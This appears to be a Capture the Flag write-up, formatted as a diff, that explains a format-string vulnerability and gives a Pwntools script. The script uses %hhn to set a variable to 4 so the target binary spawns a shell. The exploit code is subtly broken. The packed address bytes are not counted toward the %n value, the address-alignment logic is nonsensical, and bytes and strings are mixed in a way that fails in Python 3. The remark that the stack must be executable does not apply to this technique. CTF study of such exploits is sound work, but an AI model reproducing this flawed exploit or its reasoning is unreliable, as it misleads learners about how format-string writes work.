@@ -1,0 +1,113 @@
+To solve this Capture the Flag (CTF) binary exploitation challenge using Pwntools, we need to exploit a format string vulnerability to manipulate a variable `x` so that it equals `4`. When `x` equals `4`, the program executes `system("/bin/sh")`, granting us a shell. Here's a step-by-step guide and the corresponding code to achieve this:
+
+### **Step 1: Analyze the Vulnerability**
+
+1. **Format String Vulnerability**: The line `printf(buf);` in the `main` function uses the user-provided input `buf` directly as the format string without any format specifiers. This is unsafe and leads to a format string vulnerability.
+
+2. **Variable `x`**: The variable `x` is used in `printf("%d!\n", x);` and `if ( x == 4 )`. Our goal is to overwrite `x` with the value `4`.
+
+### **Step 2: Plan the Exploit Strategy**
+
+We can use the format string vulnerability to write to the memory address of `x` using the `%n` specifier.
+
+- **Find the Address of `x`**: We need to locate the memory address where `x` is stored.
+- **Craft a Payload**: Construct an input that places the address of `x` at the correct position on the stack so that `%n` will write to it.
+- **Adjust Printed Characters**: Ensure the number of characters printed before `%n` is equal to `4` so that `4` is written to `x`.
+
+### **Step 3: Write the Exploit Code Using Pwntools**
+
+Below is the complete exploit code with explanations:
+
+```python
+from pwn import *
+
+# Load the binary
+elf = context.binary = ELF('./fmt')
+
+# Start the process
+p = process('./fmt')
+
+# Get the address of 'x'
+addr_of_x = elf.symbols['x']
+addr_packed = p32(addr_of_x)
+
+log.info('Address of x: {}'.format(hex(addr_of_x)))
+
+# Step 1: Find the correct parameter index for our address
+
+# Send a payload to determine where our input appears in the stack
+payload = addr_packed * 10  # Repeat the address to pad the stack
+payload += ''.join(['%{}$x.'.format(i) for i in range(1, 20)])  # Print stack contents
+
+p.sendline(payload)
+response = p.recvline()
+
+# Decode and split the response to find our address
+indices = response.decode().split('.')
+for i, val in enumerate(indices, 1):
+    if val == '{:x}'.format(addr_of_x):
+        print('Found address at position {}'.format(i))
+        index = i
+        break
+else:
+    print('Address not found on the stack.')
+    exit()
+
+# Step 2: Craft the payload to write '4' into 'x'
+
+# Calculate padding: number of characters to print to reach '4'
+# Since we're using '%hhn', we need total printed characters to be 4
+# The '%4c' will print 4 characters (spaces)
+payload = addr_packed * (index - 1)  # Adjust the number of addresses to align with the index
+payload += '%4c%{}$hhn'.format(index)  # Write one byte ('4') to the address at the correct index
+
+# Send the final payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### **Explanation of the Exploit Code**
+
+- **Import Pwntools**: `from pwn import *` brings in the Pwntools functions.
+- **Load the Binary**: `elf = context.binary = ELF('./fmt')` loads the binary for analysis.
+- **Start the Process**: `p = process('./fmt')` runs the vulnerable program.
+- **Get Address of `x`**: `elf.symbols['x']` retrieves the address of `x`.
+- **Find Parameter Index**:
+  - We send a payload that repeats the address of `x` and appends numbered `%x` format specifiers to print stack contents.
+  - By analyzing the response, we find out at which parameter index our address appears.
+- **Craft the Final Payload**:
+  - We adjust the number of address repetitions to match the index.
+  - Use `%4c` to print 4 characters, ensuring that `%hhn` writes the value `4` (since it's the total number of printed characters).
+  - `%{}$hhn` writes one byte (`hhn`) to the address at our found index.
+- **Execute the Payload**: Send the payload and switch to interactive mode to get the shell.
+
+### **Important Functions and Concepts**
+
+- **`%n`, `%hn`, `%hhn`**:
+  - `%n` writes the number of characters printed so far into an `int *`.
+  - `%hn` writes into a `short *` (2 bytes).
+  - `%hhn` writes into a `char *` (1 byte).
+- **Parameter Indexing**:
+  - In format strings like `"%7$n"`, the `7$` specifies the 7th parameter.
+- **Address Packing**:
+  - `p32(addr_of_x)` packs the address into little-endian format suitable for a 32-bit binary.
+
+### **Running the Exploit**
+
+Ensure you have:
+
+- The vulnerable binary named `fmt`.
+- Pwntools installed (`pip install pwntools`).
+
+Run the exploit script. If successful, you will have an interactive shell.
+
+### **Notes**
+
+- **ASLR and NX**: The exploit assumes that Address Space Layout Randomization (ASLR) is disabled or predictable, and the stack is executable. In a real-world scenario, additional steps might be necessary to bypass these protections.
+- **Testing**: It's crucial to test each step separately to ensure correctness, especially when calculating parameter indices and adjusting payloads.
+
+### **Conclusion**
+
+By exploiting the format string vulnerability and carefully crafting our payload to write the desired value into the variable `x`, we can bypass the program's checks and execute arbitrary code, in this case, spawning a shell. Using Pwntools simplifies the process of interacting with the binary and automating the exploit.
